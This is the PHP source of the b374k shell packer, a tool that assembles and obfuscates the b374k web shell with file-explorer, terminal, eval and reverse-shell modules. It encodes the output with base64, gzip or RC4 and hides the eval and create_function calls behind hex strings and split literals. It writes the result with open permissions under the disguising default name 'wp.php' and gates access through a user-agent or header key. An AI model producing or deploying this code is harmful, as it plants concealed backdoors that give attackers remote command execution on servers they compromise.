<?php
/*
	b374k shell
	Jayalah Indonesiaku
	(c)2014
	https://github.com/b374k/b374k

	Version 4.1
	@phith0n
	https://github.com/phith0n/b374k
*/
$GLOBALS['packer']['title'] = "b374k shell packer";
$GLOBALS['packer']['version'] = "0.5.0";
$GLOBALS['packer']['base_dir'] = "./base/";
$GLOBALS['packer']['module_dir'] = "./module/";
$GLOBALS['packer']['theme_dir'] = "./theme/";
$GLOBALS['packer']['module'] = packer_get_module();
$GLOBALS['packer']['theme'] = packer_get_theme();
$GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
$GLOBALS['packer']['resources_dir'] = "./resources/";

$TRUST_USER_AGENT = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/64.0.3282.112 Mobile/15D60 Safari/604.1";
$debug_rc4_key = generateRandomString(32, $TRUST_USER_AGENT);
srand(time());
$supported_network_rs_types = array('executable', 'gcc', 'java', 'php', 'python');

require $GLOBALS['packer']['base_dir'].'jsPacker.php';

/* PHP FILES START */
$base_code = "";

$resources_data = packer_read_file($GLOBALS['packer']['base_dir']."resources.php");
$res_files = scandir($GLOBALS['packer']['resources_dir']);
$resources_content = "";
foreach($res_files as $res) {
    if(!in_array($res, array(".",".."))) {
        $res_data = packer_read_file($GLOBALS['packer']['resources_dir'] . $res);
        $info = pathinfo($res);
        $ext = $info['extension'];
        if($ext == 'png' || $ext == 'jpg' || $ext == 'jpeg') {
            $res_data = "data:image/".$ext.";base64," . base64_encode($res_data);
        }
        $base64_data = base64_encode(gzdeflate($res_data, 9));
        $GLOBALS['resources'][$info['filename']] = $base64_data;
        $resources_content .= "\$GLOBALS['resources']['" . $info['filename'] . "'] = '" . $base64_data . "';\n";
    }
}
$resources_data = str_replace("//<__RES__>", $resources_content, $resources_data);
$base_code .= $resources_data;

$module_code = packer_read_file($GLOBALS['packer']['base_dir']."base.php");
/* PHP FILES END */

/* JAVASCRIPT AND CSS FILES START */
$zepto_code = packer_read_file($GLOBALS['packer']['base_dir']."zepto.js");
$js_main_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."main.js");

if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
else $theme ="default";
$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");

/* JAVASCRIPT AND CSS FILES END */

// layout
$layout = packer_read_file($GLOBALS['packer']['base_dir']."layout.php");

if(isset($_SERVER['REMOTE_ADDR'])){
    $GLOBALS['cipher_key'] = $debug_rc4_key;
    if(isset($_GET['run'])){
        if(empty($_GET['run'])) $modules = array();
        else $modules = explode("," ,$_GET['run']);
        $module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);

        $module_arr = array_map("packer_wrap_with_quote", $module_arr);
        $module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

        $js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
        $js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");

        list($mc, $jc) = load_modules_data($modules, $supported_network_rs_types);
        $module_code .= $mc;
        $js_code .= $jc;

        $layout = str_replace("<__CIPHER_KEY__>", $GLOBALS['cipher_key'], $layout);
        $layout = str_replace("<__CSS__>", $css_code, $layout);
        $layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);

        $layout = str_replace("<__JS__>", $js_code, $layout);

        $htmlcode = trim($layout);
        $base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
        $phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);

        list($err, $_, $content) = packer_b374k(null, $phpcode, $htmlcode, "no", "no", "no", -1, "b374k", "kan6mh5r");
        if ($content) {
            eval("?>" . $content);
        }
        die();
    }

    $p = array_map("rawurldecode", packer_get_post());

	if(isset($p['read_file'])){
		$file = $p['read_file'];
		if(is_file($file)){
			packer_output(packer_html_safe(packer_read_file($file)));
		}
		packer_output('error');
	}elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])&&isset($p['encode'])){
        $outputfile = trim($p['outputfile']);
		if(empty($outputfile)) $outputfile = 'b374k.php';
		$password = trim($p['password']);
		$modules = trim($p['module']);
		if(empty($modules)) $modules = array();
		else $modules = explode("," ,$modules);

		$strip = trim($p['strip']);
		$base64 = trim($p['base64']);
		$compress = trim($p['compress']);
		$compress_level = (int) $p['compress_level'];
		$encode = addslashes(trim($p['encode']));

		$seed = null;
        if($compress == 'rc4' && isset($p['user_agent']) && strlen(trim($p['user_agent'])) > 0) {
            $seed = $p['user_agent'];
        }
        $GLOBALS['cipher_key'] = generateRandomString(32, $seed);
        if ($seed) {
            srand(time());
        }

		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);

		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");

        list($mc, $jc) = load_modules_data($modules, $supported_network_rs_types);
        $module_code .= $mc;
        $js_code .= $jc;

		$layout = str_replace("<__CIPHER_KEY__>", $GLOBALS['cipher_key'], $layout);
		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		
		if($strip=='yes') $js_code = packer_pack_js($js_code);
		$layout = str_replace("<__JS__>", $js_code, $layout);

		$htmlcode = trim($layout);
		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);

		list($err, $code, $_) = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
        $GLOBALS['cipher_key'] = $debug_rc4_key;
		packer_output($err . packer_html_safe(trim($code ? $code : "")));
	}else{
	$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:150px;'>";
	foreach($GLOBALS['packer']['theme'] as $k){
		if($k==$theme) $available_themes .= "<option selected='selected'>".$k."</option>";
		else $available_themes .= "<option>".$k."</option>";
	}
	$available_themes .= "</select></td></tr>";

	?><!DOCTYPE html>
	<html>
	<head>
	<title><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></title>
	<meta charset='utf-8'>
	<meta name='robots' content='noindex, nofollow, noarchive'>
    <link rel='SHORTCUT ICON' href='<?php echo packer_get_resource('b374k');?>'>
	<style type="text/css">
	<?php echo $css_code;?>
	#devTitle{
		font-size:18px;
		text-align:center;
		font-weight:bold;
	}
	</style>
	</head>
	<body>

	<div id='wrapper' style='padding:12px'>
		<div id='devTitle' class='border'><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></div>
		<br>
		<table class='boxtbl'>
			<tr><th colspan='2'><p class='boxtitle'>Quick Run</p></th></tr>
			<tr><td style='width:220px;'>Module (separated by comma)</td><td><input type='text' id='module' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
			<?php echo $available_themes; ?>
			<tr><td colspan='2'>
				<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>
				<span class='button' id='runGo'>Run</span>
				</form>
			</td></tr>
		</table>
		<br>
		<table class='boxtbl'>
			<tr><th colspan='2'><p class='boxtitle'>Pack</p></th></tr>
			<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='wp.php'></td></tr>
			<tr><td>Password</td><td><input id='password' type='text' value='b374k'></td></tr>
			<tr><td>Module (separated by comma)</td><td><input type='text' id='module_to_pack' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
			<?php echo $available_themes; ?>
			<tr><td>Strip Comments and Whitespaces</td><td>
				<select id='strip' style='width:150px;'>
					<option selected="selected">yes</option>
					<option>no</option>
				</select>
			</td></tr>

			<tr><td>Base64 Encode</td><td>
				<select id='base64' style='width:150px;'>
					<option selected="selected">yes</option>
					<option>no</option>
				</select>
			</td></tr>

			<tr id='compress_row'><td>Compress</td><td>
				<select id='compress' style='width:150px;'>
					<option>no</option>
					<option selected="selected">gzdeflate</option>
					<option>gzencode</option>
					<option>gzcompress</option>
                    <option selected="selected">rc4</option>
				</select>
				<select id='compress_level' style='width:150px;'>
					<option>1</option>
					<option>2</option>
					<option>3</option>
					<option>4</option>
					<option>5</option>
					<option>6</option>
					<option>7</option>
					<option>8</option>
					<option selected="selected">9</option>
				</select>
			</td></tr>
            <tr id="user_agent_line"><td>Trust User Agent</td><td><input type='text' id='user_agent' value='<?php echo $_SERVER['HTTP_USER_AGENT'];?>'></td></tr>
			<tr><td style='width:220px;'>Encode</td><td><input id='encode' type='text' value='utf-8'></td></tr>

			<tr><td colspan='2'>
				<span class='button' id='packGo'>Pack</span>
			</td></tr>
			<tr><td colspan='2' id='result'></td></tr>
			<tr><td colspan='2'><textarea id='resultContent'></textarea></td></tr>
		</table>
	</div>

	<script type='text/javascript'>
    window['cipher_key'] = '<?php echo $GLOBALS['cipher_key'];?>';
	var init_shell = false;
	<?php echo $zepto_code;?>
	<?php echo $js_main_code;?>

	var targeturl = '<?php echo packer_get_self(); ?>';

	Zepto(function($){
		refresh_row();

		$('#runGo').on('click', function(e){
            var module = $('#module').val();
			$('#module_to_run').val(module);
			$('#runForm').submit();
		});

		$('#base64').on('change', function(e){
			refresh_row();
		});
        $('#compress').on('change', function(e){
            var c = $(this).val();
            var cl = $('#compress_level');
            if(c === 'no') {
                cl.hide();
            } else {
                cl.show();
            }
            var ua = $('#user_agent_line');
            if(c !== 'rc4') {
                ua.hide();
            } else {
                ua.show();
            }
        });

		$('#packGo').on('click', function(e){
			var outputfile = $('#outputfile').val();
            var password = $('#password').val();
            var module = $('#module_to_pack').val();
            var strip = $('#strip').val();
            var base64 = $('#base64').val();
            var compress = $('#compress').val();
            var compress_level = $('#compress_level').val();
            var encode = $('#encode').val();
            var user_agent = $('#user_agent').val();

			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level, encode:encode, user_agent:user_agent}, function(res){
				var splits = res.split('{[|a374k|]}');
				$('#resultContent').html(splits[1]);
				$('#result').html(splits[0]);
			});

		});

		var tm = $('.theme');
		tm.on('change', function(e){
            tm.val($(this).val());
			set_cookie('packer_theme', tm.val());
			location.href = targeturl;
		});
	});

	function refresh_row(){
        var b = $('#base64').val();
        var ua = $('#user_agent_line');
		if(b==='yes'){
			$('#compress_row').show();
            $('#compress').val('rc4');
            ua.show();
		}else{
			$('#compress_row').hide();
			$('#compress').val('no');
            ua.hide();
		}
	}

	</script>
	</body>
	</html><?php
	}
}else{
	$output = $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version']."\n\n";

	if(count($argv)<=1){
		$output .= "options :\n";
        $output .= "\t-d\t\t\t\t\tdev mode\n";
		$output .= "\t-o filename\t\t\t\tsave as filename\n";
		$output .= "\t-p password\t\t\t\tprotect with password\n";
		$output .= "\t-t theme\t\t\t\ttheme to use\n";
		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
		$output .= "\t-b\t\t\t\t\tencode with base64\n";
		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress|rc4]\tcompression (use only with -b)\n";
		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
		$output .= "\t-l\t\t\t\t\tlist available modules\n";
		$output .= "\t-k\t\t\t\t\tlist available themes\n";
		$output .= "\t-u code\t\t\t\t\tsystem language encode, such as utf-8/gb2312/gbk..\n";
	}
	else{
		$opt = getopt("do:p:t:m:sbz:c:lku:");

        if (isset($opt['d'])) {
            $GLOBALS['cipher_key'] = $debug_rc4_key;
        } else {
            $GLOBALS['cipher_key'] = generateRandomString(32);
        }

		if(isset($opt['l'])){
			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
			echo $output;
			die();
		}
		
		if(isset($opt['k'])){
			$output .= "available themes : ".implode(",", $GLOBALS['packer']['theme'])."\n\n";
			echo $output;
			die();
		}

		if(isset($opt['o'])&&(trim($opt['o'])!='')){
			$outputfile = trim($opt['o']);
		}else{
			$output .= "error : no filename given (use -o filename)\n\n";
			echo $output;
			die();
		}

		$password = isset($opt['p'])? trim($opt['p']):"";
		$theme = isset($opt['t'])? trim($opt['t']):"default";
		if(!in_array($theme, $GLOBALS['packer']['theme'])){
			$output .= "error : unknown theme file\n\n";
			echo $output;
			die();
		}
		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
		
		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
		if(empty($modules)) $modules = array();
		else $modules = explode("," ,$modules);

		$strip = isset($opt['s'])? "yes":"no";
		$base64 = isset($opt['b'])? "yes":"no";
		$encode = isset($opt['u'])? addslashes(strtolower($opt['u'])):"utf-8";

		$compress = isset($opt['z'])? trim($opt['z']):"no";
		if(!in_array($compress, array('gzdeflate','gzencode','gzcompress','rc4','no'))){
			$output .= "error : unknown options -z ".$compress."\n\n";
			echo $output;
			die();
		}else{
			if(($base64=='no')&&($compress!='no')){
				$output .= "error : use -z options only with -b\n\n";
				echo $output;
				die();
			}
		}

		$compress_level = isset($opt['c'])? trim($opt['c']):"";
		if(empty($compress_level)) $compress_level = '9';
		if(!preg_match("/^[0-9]{1}$/", $compress_level)){
			$output .= "error : unknown options -c ".$compress_level." (use only 0-9)\n\n";
			echo $output;
			die();
		}
		$compress_level = (int) $compress_level;

		$output .= "Filename\t\t: ".$outputfile."\n";
		$output .= "Password\t\t: ".$password."\n";
		$output .= "Theme\t\t\t: ".$theme."\n";
		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
		$output .= "Strip\t\t\t: ".$strip."\n";
		$output .= "Base64\t\t\t: ".$base64."\n";
        if ($compress == "rc4") {
            $output .= "RC4 Cipher Key\t\t: " . $GLOBALS['cipher_key'] . "\n";
        }
		$output .= "Code\t\t\t: " . $encode . "\n";
		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";

		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
        // $js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."md5.js");
		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");

        list($mc, $jc) = load_modules_data($modules, $supported_network_rs_types);
        $module_code .= $mc;
        $js_code .= $jc;

		$layout = str_replace("<__CIPHER_KEY__>", $GLOBALS['cipher_key'], $layout);
		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		
		if($strip=='yes') $js_code = packer_pack_js($js_code);
		$layout = str_replace("<__JS__>", $js_code, $layout);

		$htmlcode = trim($layout);
		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);

        list($err, $code, $_) = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password/*, isset($opt['d']) ? 'kan6mh5r' : null*/);
        $res = $err . packer_html_safe(trim($code ? $code : ""));
		$status = explode("{[|a374k|]}", $res);
		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
	}
	echo $output;
}

function load_modules_data($modules, $supported_types) {
    $module_code = "";
    $js_code = "";
    foreach($modules as $module){
        $module = trim($module);
        $filename = $GLOBALS['packer']['module_dir'].$module;
        if(is_file($filename.".php")) {
            $php_data = packer_read_file($filename.".php");

            if($module == 'network') {
                $files = scandir($GLOBALS['packer']['network_rs_dir']);
                $rs_content = "";
                foreach($files as $rs) {
                    if(!in_array($rs, array(".",".."))) {
                        $name = pathinfo($rs, PATHINFO_FILENAME);
                        if (in_array($name, $supported_types)) {
                            $rs_data = packer_read_file($GLOBALS['packer']['network_rs_dir'] . $rs);
                            $rs_content .= "\$GLOBALS['resources']['rs_" . $name . "'] = '" . base64_encode(gzdeflate($rs_data, 9)) . "';\n";
                        }
                    }
                }
                $php_data = str_replace("//<__RS__>", $rs_content, $php_data);
            }

            $module_code .= $php_data;
        }
        if(is_file($filename.".js")) {
            $js_data = packer_read_file($filename.".js");
            if($module == 'network') {
                $js_data = str_replace("//<__ST__>", "var supported_types = [\"" . join('","', $supported_types) . "\"];", $js_data);
            }
            $js_code .= "\n".$js_data."\n";
        }
    }
    return array($module_code, $js_code);
}

function packer_read_file($file){
	$content = false;
	if($fh = @fopen($file, "rb")){
		$content = "";
		while(!feof($fh)){
		  $content .= fread($fh, 8192);
		}
	}
	return $content;
}

function packer_write_file($file, $content){
	if($fh = @fopen($file, "wb")){
		if(fwrite($fh, $content)!==false){
			if(!class_exists("ZipArchive")) return true;
			
			if(file_exists($file.".zip")) unlink ($file.".zip");
			$zip = new ZipArchive();
			$filename = "./".$file.".zip";

			if($zip->open($filename, ZipArchive::CREATE)!==TRUE) return false;
			$zip->addFile($file);
			$zip->close();
			return true;
		}
		fclose($fh);
	}
	return false;
}

function packer_get_post(){
    $post = packer_fix_magic_quote($_POST);
    if(empty($_FILES) && is_ajax()) {
        $post_str = rc4($GLOBALS['cipher_key'], hex2bin($post['args']));
        parse_str($post_str, $post);
        $post = packer_fix_magic_quote($post);
    }
    return $post;
}

function is_ajax() {
    return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
}

function packer_fix_magic_quote($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		if(is_array($arr)){
			foreach($arr as $k=>$v){
				if(is_array($v)) $arr[$k] = packer_fix_magic_quote($v);
				else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
			}
		}
	}
	return $arr;
}

function packer_html_safe($str){
	return htmlspecialchars($str, 2 | 1);
}

function packer_wrap_with_quote($str){
	return "\"".$str."\"";
}

function packer_output($str){
	header("Content-Type: text/plain");
	header("Cache-Control: no-cache");
	header("Pragma: no-cache");
    $str = @date("d-M-Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|0|'.$str;
    $c = bin2hex(rc4($GLOBALS['cipher_key'], $str));
    if (strlen($c) > 10240) {
        @ini_set('zlib.output_compression', TRUE);
    }
    echo $c;
	die();
}

function packer_get_self(){
	$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";	
	return packer_html_safe($_SERVER['SCRIPT_NAME'].$query);
}

function packer_strips($str){
	$newStr = '';

	$commentTokens = array(T_COMMENT);

	if(defined('T_DOC_COMMENT')) $commentTokens[] = T_DOC_COMMENT;
	if(defined('T_ML_COMMENT'))	$commentTokens[] = T_ML_COMMENT;

	$tokens = token_get_all($str);

	foreach($tokens as $token){
		if (is_array($token)) {
			if (in_array($token[0], $commentTokens)) continue;
			$token = $token[1];
		}
	    $newStr .= $token;
	}
	return preg_replace("/(\s{2,})/", " ", $newStr);
}

function packer_get_theme(){
	$available_themes = array();
	foreach(glob($GLOBALS['packer']['theme_dir']."*.css") as $filename){
		$filename = basename($filename, ".css");
		$available_themes[] = $filename;
	}
	return $available_themes;
}

function packer_get_module(){
	$available_modules = array();
	foreach(glob($GLOBALS['packer']['module_dir']."*.php") as $filename){
		$filename = basename($filename, ".php");
		if(packer_check_module($filename)) $available_modules[] = $filename;
	}
	return $available_modules;
}

function packer_check_module($module){
	$filename = $GLOBALS['packer']['module_dir'].$module;
	if(is_file($filename.".php")){
		$content = packer_read_file($filename.".php");
		@eval("?>".$content);
		if($GLOBALS['module'][$module]['id']==$module) return true;
	}
	return false;
}

function packer_pack_js($str){
	$packer = new JavaScriptPacker($str, 0, true, false);
	return $packer->pack();
}

function packer_get_resource($type){
    if(isset($GLOBALS['resources'][$type])){
        return gzinflate(base64_decode($GLOBALS['resources'][$type]));
    }
    return false;
}

function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password, $salt=null){
	if($output && is_file($output)){
		if(!is_writable($output)) return array("error : file ".$output." exists and is not writable{[|a374k|]}", null, null);
	}

	if(!empty($password)) $password = "\$GLOBALS['token']=\"".cryptMyMd5($password, $salt)."\";";
	$cipher_key = "\$GLOBALS['cipher_key']=\"" . $GLOBALS['cipher_key'] . "\";";

	$compress_level = (int) $compress_level;
	if($compress_level<0) $compress_level = 0;
	elseif($compress_level>9) $compress_level = 9;

	$header = "";
    if ($output) {
        $header = "<?php\n";
    }
    $bds = '_'.generateRandomString(2);
    $cs = '_'.generateRandomString(2);
	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){if(!$a){return 0;}$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function '.$bds.'($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}function '.$cs.'($s){srand(crc32(trim($s)));$cs="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";$cl=strlen($cs)-1;$s="";for($i=0;$i<32;$i++){$s.=$cs[rand(0,$cl)];}srand(time());return $s;}':'';

	if($strip=='yes'){
		$phpcode = packer_strips($phpcode);
		$htmlcode = preg_replace("/(\ {2,}|\n{2,}|\t+)/", "", $htmlcode);
		$htmlcode = preg_replace("/\r/", "", $htmlcode);
		$htmlcode = preg_replace("/}\n+/", "}", $htmlcode);
		$htmlcode = preg_replace("/\n+}/", "}", $htmlcode);
		$htmlcode = preg_replace("/\n+{/", "{", $htmlcode);
		$htmlcode = preg_replace("/\n+/", "\n", $htmlcode);
	}


	$content = $phpcode.$htmlcode;
	$content = preg_replace('/^<\?php/s', '<?php ' . $cipher_key, $content);

	if($compress=='gzdeflate'){
		$content = gzdeflate($content, $compress_level);
		$encoder_func = "gz'.'in'.'fla'.'te";
	}elseif($compress=='gzencode'){
		$content = gzencode($content, $compress_level);
		$encoder_func = "gz'.'de'.'co'.'de";
	}elseif($compress=='gzcompress'){
		$content = gzcompress($content, $compress_level);
		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
	}elseif($compress=="rc4"){
		$content = rc4($GLOBALS['cipher_key'], bzcompress($content, $compress_level));
		$encoder_func = "r"."c4";
	}else{
		$encoder_func = "";
	}

	if($base64=='yes'){
		$content = base64_encode($content);
		if($compress!='no'){
			if($compress=="rc4") {
				$encoder = $bds."(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:".$cs."(\$_SERVER[\\'HTTP_USER_AGENT\\']),ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
			} else {
				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
			}
		}else{
			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
		}

		$func = '_'.generateRandomString(2);
		$code = $header.$password."\$cf=hex2bin('".bin2hex("create_function")."');\$".$func."=\$cf('\$x',hex2bin('".bin2hex("eval")."').'(\"?>\".".$encoder.");');\$".$func."(\"".$content."\");{$rc4_function}?>";
	}else{
        $code = $header.$password."?>".$content;
        $code = preg_replace("/\?>\s*<\?php\s*/", "", $code);
	}

	if($output && is_file($output)) unlink($output);
    if (!$output) {
        return array(null, $code, $content);
    }
	if(packer_write_file($output, $code)){
		chmod($output, 0777);
		$is_rc4 = $compress=="rc4";
		return array("Succeeded : [ <a href='".$output."' target='_blank'>".$output."</a> ] Filesize : ".filesize($output). ($is_rc4 ? (", X-Csrf-Token : " . $GLOBALS['cipher_key']) : "") . "{[|a374k|]}", $code, null);
	}
	return array("error{[|a374k|]}", null, null);
}

function generateRandomString($length = 10, $seed = null) {
    if ($seed) {
        srand(crc32(trim($seed)));
    }
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function rc4($key, $str) {
	$s = array();
	for ($i = 0; $i < 256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	for ($i = 0; $i < 256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$res = '';
	for ($y = 0; $y < strlen($str); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $res;
}

function cryptMyMd5($input, $extra_salt=null){
    $salt = $extra_salt == null ? substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 8) : $extra_salt;
    $len = strlen($input);
    $text = $input . '$a374k$' . $salt;
    $bin = pack("H32", md5($input . $salt . $input));
    for ($i = $len; $i > 0; $i -= 16) {
        $text .= substr($bin, 0, min(16, $i));
    }
    for ($i = $len; $i > 0; $i >>= 1) {
        $text .= ($i & 1) ? chr(0) : $input{0};
    }
    $bin = pack("H32", md5($text));
    for ($i = 0; $i < 1000; $i++) {
        $new = ($i & 1) ? $input : $bin;
        if ($i % 3) $new .= $salt;
        if ($i % 7) $new .= $input;
        $new .= ($i & 1) ? $bin : $input;
        $bin = pack("H32", md5($new));
    }
    $tmp = '';
    for ($i = 0; $i < 5; $i++) {
        $k = $i + 6;
        $j = $i + 12;
        if ($j == 16) $j = 5;
        $tmp = $bin[$i] . $bin[$k] . $bin[$j] . $tmp;
    }
    $tmp = chr(0) . chr(0) . $bin[11] . $tmp;
    $tmp = base64_encode($tmp);
    $tmp = substr($tmp, 2);
    $tmp = strrev($tmp);
    $tmp = strtr($tmp,
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
        "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
    return $salt . "#" . $tmp;
}

?>
